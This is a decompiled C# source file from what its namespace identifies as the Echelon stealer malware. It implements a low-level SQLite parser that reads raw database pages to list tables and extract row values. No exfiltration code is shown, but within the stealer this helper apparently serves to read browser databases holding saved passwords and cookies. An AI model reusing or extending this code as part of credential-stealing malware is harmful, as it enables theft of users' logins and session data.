using System;
using System.IO;
using System.Text;
using Microsoft.VisualBasic;
using Microsoft.VisualBasic.CompilerServices;

namespace Echelon.Stealer.Browsers.Helpers
{
	// Token: 0x02000027 RID: 39
	public class CNT
	{
		// Token: 0x0600006E RID: 110 RVA: 0x00006218 File Offset: 0x00004418
		public CNT(string baseName)
		{
			this.SQLDataTypeSize = new byte[]
			{
				0,
				1,
				2,
				3,
				4,
				6,
				8,
				8,
				0,
				0
			};
			if (File.Exists(baseName))
			{
				FileSystem.FileOpen(1, baseName, OpenMode.Binary, OpenAccess.Read, OpenShare.Shared, -1);
				string s = Strings.Space((int)FileSystem.LOF(1));
				FileSystem.FileGet(1, ref s, -1L, false);
				FileSystem.FileClose(new int[]
				{
					1
				});
				this.DataArray = Encoding.Default.GetBytes(s);
				this.PageSize = (ushort)this.ToUInt64(16, 2);
				this.DataEncoding = this.ToUInt64(56, 4);
				if (decimal.Compare(new decimal(this.DataEncoding), 0m) == 0)
				{
					this.DataEncoding = 1L;
				}
				this.ReadDataEntries(100UL);
			}
		}

		// Token: 0x17000005 RID: 5
		// (get) Token: 0x0600006F RID: 111 RVA: 0x000062E0 File Offset: 0x000044E0
		private byte[] DataArray { get; }

		// Token: 0x17000006 RID: 6
		// (get) Token: 0x06000070 RID: 112 RVA: 0x000062E8 File Offset: 0x000044E8
		private ulong DataEncoding { get; }

		// Token: 0x17000007 RID: 7
		// (get) Token: 0x06000071 RID: 113 RVA: 0x000062F0 File Offset: 0x000044F0
		// (set) Token: 0x06000072 RID: 114 RVA: 0x000062F8 File Offset: 0x000044F8
		public string[] Fields { get; set; }

		// Token: 0x17000008 RID: 8
		// (get) Token: 0x06000073 RID: 115 RVA: 0x00006304 File Offset: 0x00004504
		public int RowLength
		{
			get
			{
				return this.SqlRows.Length;
			}
		}

		// Token: 0x17000009 RID: 9
		// (get) Token: 0x06000074 RID: 116 RVA: 0x00006310 File Offset: 0x00004510
		private ushort PageSize { get; }

		// Token: 0x1700000A RID: 10
		// (get) Token: 0x06000075 RID: 117 RVA: 0x00006318 File Offset: 0x00004518
		// (set) Token: 0x06000076 RID: 118 RVA: 0x00006320 File Offset: 0x00004520
		private FF[] DataEntries { get; set; }

		// Token: 0x1700000B RID: 11
		// (get) Token: 0x06000077 RID: 119 RVA: 0x0000632C File Offset: 0x0000452C
		// (set) Token: 0x06000078 RID: 120 RVA: 0x00006334 File Offset: 0x00004534
		private ROW[] SqlRows { get; set; }

		// Token: 0x1700000C RID: 12
		// (get) Token: 0x06000079 RID: 121 RVA: 0x00006340 File Offset: 0x00004540
		private byte[] SQLDataTypeSize { get; }

		// Token: 0x0600007A RID: 122 RVA: 0x00006348 File Offset: 0x00004548
		public string[] ParseTables()
		{
			string[] array = null;
			int num = 0;
			int num2 = this.DataEntries.Length - 1;
			for (int i = 0; i <= num2; i++)
			{
				if (this.DataEntries[i].Type == "table")
				{
					array = (string[])Utils.CopyArray(array, new string[num + 1]);
					array[num] = this.DataEntries[i].Name;
					num++;
				}
			}
			return array;
		}

		// Token: 0x0600007B RID: 123 RVA: 0x000063C8 File Offset: 0x000045C8
		public string ParseValue(int rowIndex, int fieldIndex)
		{
			if (rowIndex >= this.SqlRows.Length)
			{
				return null;
			}
			if (fieldIndex >= this.SqlRows[rowIndex].RowData.Length)
			{
				return null;
			}
			return this.SqlRows[rowIndex].RowData[fieldIndex];
		}

		// Token: 0x0600007C RID: 124 RVA: 0x0000641C File Offset: 0x0000461C
		public string ParseValue(int rowIndex, string fieldName)
		{
			int num = -1;
			int num2 = this.Fields.Length - 1;
			for (int i = 0; i <= num2; i++)
			{
				if (this.Fields[i].ToLower().Trim().CompareTo(fieldName.ToLower().Trim()) == 0)
				{
					num = i;
					break;
				}
			}
			if (num == -1)
			{
				return null;
			}
			return this.ParseValue(rowIndex, num);
		}

		// Token: 0x0600007D RID: 125 RVA: 0x0000648C File Offset: 0x0000468C
		public bool ReadTable(string tableName)
		{
			int num = -1;
			int num2 = this.DataEntries.Length - 1;
			for (int i = 0; i <= num2; i++)
			{
				if (this.DataEntries[i].Name.ToLower().CompareTo(tableName.ToLower()) == 0)
				{
					num = i;
					break;
				}
			}
			if (num == -1)
			{
				return false;
			}
			string[] array = this.DataEntries[num].SqlStatement.Substring(this.DataEntries[num].SqlStatement.IndexOf("(") + 1).Split(new char[]
			{
				','
			});
			int num3 = array.Length - 1;
			for (int j = 0; j <= num3; j++)
			{
				array[j] = array[j].TrimStart(new char[0]);
				int num4 = array[j].IndexOf(" ");
				if (num4 > 0)
				{
					array[j] = array[j].Substring(0, num4);
				}
				if (array[j].IndexOf("UNIQUE") == 0)
				{
					break;
				}
				this.Fields = (string[])Utils.CopyArray(this.Fields, new string[j + 1]);
				this.Fields[j] = array[j];
			}
			return this.ReadDataEntriesFromOffsets((ulong)((this.DataEntries[num].RootNum - 1L) * (long)((ulong)this.PageSize)));
		}

		// Token: 0x0600007E RID: 126 RVA: 0x00006610 File Offset: 0x00004810
		private ulong ToUInt64(int startIndex, int Size)
		{
			if (Size > 8 || Size == 0)
			{
				return 0UL;
			}
			ulong num = 0UL;
			for (int i = 0; i <= Size - 1; i++)
			{
				num = (num << 8 | (ulong)this.DataArray[startIndex + i]);
			}
			return num;
		}

		// Token: 0x0600007F RID: 127 RVA: 0x00006658 File Offset: 0x00004858
		private long CalcVertical(int startIndex, int endIndex)
		{
			endIndex++;
			byte[] array = new byte[8];
			int num = endIndex - startIndex;
			bool flag = false;
			if (num == 0 | num > 9)
			{
				return 0L;
			}
			if (num != 1)
			{
				if (num == 9)
				{
					flag = true;
				}
				int num2 = 1;
				int num3 = 7;
				int num4 = 0;
				if (flag)
				{
					array[0] = this.DataArray[endIndex - 1];
					endIndex--;
					num4 = 1;
				}
				for (int i = endIndex - 1; i >= startIndex; i += -1)
				{
					if (i - 1 >= startIndex)
					{
						array[num4] = (byte)(((int)((byte)(this.DataArray[i] >> (num2 - 1 & 7))) & 255 >> num2) | (int)((byte)(this.DataArray[i - 1] << (num3 & 7))));
						num2++;
						num4++;
						num3--;
					}
					else if (!flag)
					{
						array[num4] = (byte)((int)((byte)(this.DataArray[i] >> (num2 - 1 & 7))) & 255 >> num2);
					}
				}
				return BitConverter.ToInt64(array, 0);
			}
			array[0] = (this.DataArray[startIndex] & 127);
			return BitConverter.ToInt64(array, 0);
		}

		// Token: 0x06000080 RID: 128 RVA: 0x0000677C File Offset: 0x0000497C
		private int GetValues(int startIndex)
		{
			if (startIndex > this.DataArray.Length)
			{
				return 0;
			}
			int num = startIndex + 8;
			for (int i = startIndex; i <= num; i++)
			{
				if (i > this.DataArray.Length - 1)
				{
					return 0;
				}
				if ((this.DataArray[i] & 128) != 128)
				{
					return i;
				}
			}
			return startIndex + 8;
		}

		// Token: 0x06000081 RID: 129 RVA: 0x000067E0 File Offset: 0x000049E0
		public static bool ItIsOdd(long value)
		{
			return (value & 1L) == 1L;
		}

		// Token: 0x06000082 RID: 130 RVA: 0x000067EC File Offset: 0x000049EC
		private void ReadDataEntries(ulong Offset)
		{
			if (this.DataArray[(int)((uint)Offset)] == 13)
			{
				ushort num = (this.ToUInt64((Offset.ForceTo<decimal>() + 3m).ForceTo<int>(), 2).ForceTo<decimal>() - 1m).ForceTo<ushort>();
				int num2 = 0;
				if (this.DataEntries != null)
				{
					num2 = this.DataEntries.Length;
					this.DataEntries = (FF[])Utils.CopyArray(this.DataEntries, new FF[this.DataEntries.Length + (int)num + 1]);
				}
				else
				{
					this.DataEntries = new FF[(int)(num + 1)];
				}
				int num3 = (int)num;
				for (int i = 0; i <= num3; i++)
				{
					ulong num4 = this.ToUInt64((Offset.ForceTo<decimal>() + 8m + (i * 2).ForceTo<decimal>()).ForceTo<int>(), 2);
					if (decimal.Compare(Offset.ForceTo<decimal>(), 100m) != 0)
					{
						num4 += Offset;
					}
					int num5 = this.GetValues(num4.ForceTo<int>());
					this.CalcVertical(num4.ForceTo<int>(), num5);
					int num6 = this.GetValues((num4.ForceTo<decimal>() + num5.ForceTo<decimal>() - num4.ForceTo<decimal>() + 1m).ForceTo<int>());
					this.DataEntries[num2 + i].ID = this.CalcVertical((num4.ForceTo<decimal>() + num5.ForceTo<decimal>() - num4.ForceTo<decimal>() + 1m).ForceTo<int>(), num6);
					num4 = (num4.ForceTo<decimal>() + num6.ForceTo<decimal>() - num4.ForceTo<decimal>() + 1m).ForceTo<ulong>();
					num5 = this.GetValues(num4.ForceTo<int>());
					num6 = num5;
					long value = this.CalcVertical(num4.ForceTo<int>(), num5);
					long[] array = new long[5];
					int num7 = 0;
					do
					{
						num5 = num6 + 1;
						num6 = this.GetValues(num5);
						array[num7] = this.CalcVertical(num5, num6);
						if (array[num7] > 9L)
						{
							if (CNT.ItIsOdd(array[num7]))
							{
								array[num7] = (long)Math.Round((double)(array[num7] - 13L) / 2.0);
							}
							else
							{
								array[num7] = (long)Math.Round((double)(array[num7] - 12L) / 2.0);
							}
						}
						else
						{
							array[num7] = (long)((ulong)this.SQLDataTypeSize[(int)array[num7]]);
						}
						num7++;
					}
					while (num7 <= 4);
					Encoding encoding = Encoding.Default;
					decimal value2 = this.DataEncoding.ForceTo<decimal>();
					if (!1m.Equals(value2))
					{
						if (!2m.Equals(value2))
						{
							if (3m.Equals(value2))
							{
								encoding = Encoding.BigEndianUnicode;
							}
						}
						else
						{
							encoding = Encoding.Unicode;
						}
					}
					else
					{
						encoding = Encoding.Default;
					}
					this.DataEntries[num2 + i].Type = encoding.GetString(this.DataArray, Convert.ToInt32(decimal.Add(new decimal(num4), new decimal(value))), (int)array[0]);
					this.DataEntries[num2 + i].Name = encoding.GetString(this.DataArray, Convert.ToInt32(decimal.Add(decimal.Add(new decimal(num4), new decimal(value)), new decimal(array[0]))), (int)array[1]);
					this.DataEntries[num2 + i].RootNum = (long)this.ToUInt64(Convert.ToInt32(decimal.Add(decimal.Add(decimal.Add(decimal.Add(new decimal(num4), new decimal(value)), new decimal(array[0])), new decimal(array[1])), new decimal(array[2]))), (int)array[3]);
					this.DataEntries[num2 + i].SqlStatement = encoding.GetString(this.DataArray, Convert.ToInt32(decimal.Add(decimal.Add(decimal.Add(decimal.Add(decimal.Add(new decimal(num4), new decimal(value)), new decimal(array[0])), new decimal(array[1])), new decimal(array[2])), new decimal(array[3]))), (int)array[4]);
				}
				return;
			}
			if (this.DataArray[(int)((uint)Offset)] != 5)
			{
				return;
			}
			int num8 = (int)Convert.ToUInt16(decimal.Subtract(new decimal(this.ToUInt64(Convert.ToInt32(decimal.Add(new decimal(Offset), 3m)), 2)), 1m));
			for (int j = 0; j <= num8; j++)
			{
				ushort num9 = (ushort)this.ToUInt64(Convert.ToInt32(decimal.Add(decimal.Add(new decimal(Offset), 12m), new decimal(j * 2))), 2);
				if (decimal.Compare(new decimal(Offset), 100m) == 0)
				{
					this.ReadDataEntries(Convert.ToUInt64(decimal.Multiply(decimal.Subtract(new decimal(this.ToUInt64((int)num9, 4)), 1m), new decimal((int)this.PageSize))));
				}
				else
				{
					this.ReadDataEntries(Convert.ToUInt64(decimal.Multiply(decimal.Subtract(new decimal(this.ToUInt64((int)(Offset + (ulong)num9), 4)), 1m), new decimal((int)this.PageSize))));
				}
			}
			this.ReadDataEntries(Convert.ToUInt64(decimal.Multiply(decimal.Subtract(new decimal(this.ToUInt64(Convert.ToInt32(decimal.Add(new decimal(Offset), 8m)), 4)), 1m), new decimal((int)this.PageSize))));
		}

		// Token: 0x06000083 RID: 131 RVA: 0x00006E34 File Offset: 0x00005034
		private bool ReadDataEntriesFromOffsets(ulong Offset)
		{
			if (this.DataArray[(int)((uint)Offset)] == 13)
			{
				int num = Convert.ToInt32(decimal.Subtract(new decimal(this.ToUInt64(Convert.ToInt32(decimal.Add(new decimal(Offset), 3m)), 2)), 1m));
				int num2 = 0;
				if (this.SqlRows != null)
				{
					num2 = this.SqlRows.Length;
					this.SqlRows = (ROW[])Utils.CopyArray(this.SqlRows, new ROW[this.SqlRows.Length + num + 1]);
				}
				else
				{
					this.SqlRows = new ROW[num + 1];
				}
				int num3 = num;
				for (int i = 0; i <= num3; i++)
				{
					SZ[] array = null;
					ulong num4 = this.ToUInt64(Convert.ToInt32(decimal.Add(decimal.Add(new decimal(Offset), 8m), new decimal(i * 2))), 2);
					if (decimal.Compare(new decimal(Offset), 100m) != 0)
					{
						num4 += Offset;
					}
					int num5 = this.GetValues((int)num4);
					this.CalcVertical((int)num4, num5);
					int num6 = this.GetValues(Convert.ToInt32(decimal.Add(decimal.Add(new decimal(num4), decimal.Subtract(new decimal(num5), new decimal(num4))), 1m)));
					this.SqlRows[num2 + i].ID = this.CalcVertical(Convert.ToInt32(decimal.Add(decimal.Add(new decimal(num4), decimal.Subtract(new decimal(num5), new decimal(num4))), 1m)), num6);
					num4 = Convert.ToUInt64(decimal.Add(decimal.Add(new decimal(num4), decimal.Subtract(new decimal(num6), new decimal(num4))), 1m));
					num5 = this.GetValues((int)num4);
					num6 = num5;
					long num7 = this.CalcVertical((int)num4, num5);
					long num8 = Convert.ToInt64(decimal.Add(decimal.Subtract(new decimal(num4), new decimal(num5)), 1m));
					int num9 = 0;
					while (num8 < num7)
					{
						array = (SZ[])Utils.CopyArray(array, new SZ[num9 + 1]);
						num5 = num6 + 1;
						num6 = this.GetValues(num5);
						array[num9].Type = this.CalcVertical(num5, num6);
						if (array[num9].Type > 9L)
						{
							if (CNT.ItIsOdd(array[num9].Type))
							{
								array[num9].Size = (long)Math.Round((double)(array[num9].Type - 13L) / 2.0);
							}
							else
							{
								array[num9].Size = (long)Math.Round((double)(array[num9].Type - 12L) / 2.0);
							}
						}
						else
						{
							array[num9].Size = (long)((ulong)this.SQLDataTypeSize[(int)array[num9].Type]);
						}
						num8 = num8 + (long)(num6 - num5) + 1L;
						num9++;
					}
					this.SqlRows[num2 + i].RowData = new string[array.Length - 1 + 1];
					int num10 = 0;
					int num11 = array.Length - 1;
					for (int j = 0; j <= num11; j++)
					{
						if (array[j].Type > 9L)
						{
							if (!CNT.ItIsOdd(array[j].Type))
							{
								if (decimal.Compare(new decimal(this.DataEncoding), 1m) == 0)
								{
									this.SqlRows[num2 + i].RowData[j] = Encoding.Default.GetString(this.DataArray, Convert.ToInt32(decimal.Add(decimal.Add(new decimal(num4), new decimal(num7)), new decimal(num10))), (int)array[j].Size);
								}
								else if (decimal.Compare(new decimal(this.DataEncoding), 2m) == 0)
								{
									this.SqlRows[num2 + i].RowData[j] = Encoding.Unicode.GetString(this.DataArray, Convert.ToInt32(decimal.Add(decimal.Add(new decimal(num4), new decimal(num7)), new decimal(num10))), (int)array[j].Size);
								}
								else if (decimal.Compare(new decimal(this.DataEncoding), 3m) == 0)
								{
									this.SqlRows[num2 + i].RowData[j] = Encoding.BigEndianUnicode.GetString(this.DataArray, Convert.ToInt32(decimal.Add(decimal.Add(new decimal(num4), new decimal(num7)), new decimal(num10))), (int)array[j].Size);
								}
							}
							else
							{
								this.SqlRows[num2 + i].RowData[j] = Encoding.Default.GetString(this.DataArray, Convert.ToInt32(decimal.Add(decimal.Add(new decimal(num4), new decimal(num7)), new decimal(num10))), (int)array[j].Size);
							}
						}
						else
						{
							this.SqlRows[num2 + i].RowData[j] = Convert.ToString(this.ToUInt64(Convert.ToInt32(decimal.Add(decimal.Add(new decimal(num4), new decimal(num7)), new decimal(num10))), (int)array[j].Size));
						}
						num10 += (int)array[j].Size;
					}
				}
			}
			else if (this.DataArray[(int)((uint)Offset)] == 5)
			{
				int num12 = (int)Convert.ToUInt16(decimal.Subtract(new decimal(this.ToUInt64(Convert.ToInt32(decimal.Add(new decimal(Offset), 3m)), 2)), 1m));
				for (int k = 0; k <= num12; k++)
				{
					ushort num13 = (ushort)this.ToUInt64(Convert.ToInt32(decimal.Add(decimal.Add(new decimal(Offset), 12m), new decimal(k * 2))), 2);
					this.ReadDataEntriesFromOffsets(Convert.ToUInt64(decimal.Multiply(decimal.Subtract(new decimal(this.ToUInt64((int)(Offset + (ulong)num13), 4)), 1m), new decimal((int)this.PageSize))));
				}
				this.ReadDataEntriesFromOffsets(Convert.ToUInt64(decimal.Multiply(decimal.Subtract(new decimal(this.ToUInt64(Convert.ToInt32(decimal.Add(new decimal(Offset), 8m)), 4)), 1m), new decimal((int)this.PageSize))));
			}
			return true;
		}
	}
}
